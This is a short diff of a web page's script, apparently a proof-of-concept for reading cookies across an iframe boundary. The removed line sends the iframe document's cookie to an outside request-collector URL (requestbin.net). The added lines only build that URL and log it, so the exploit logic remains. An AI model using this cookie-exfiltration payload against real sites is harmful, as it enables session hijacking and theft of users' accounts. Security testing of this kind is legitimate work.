@@ -28,7 +28,8 @@ var xhr = new XMLHttpRequest()
 
     <script>
         $('#frame1').load(function() { 
-        document.location='http://requestbin.net/r/1iksjrn1?c=' + document.getElementById("frame1").contentDocument.cookie;
+        var url='http://requestbin.net/r/1iksjrn1?c=' + document.getElementById("frame1").contentDocument.cookie;
+        console.log("payload = " + url);
         })
     </script>
 </body>
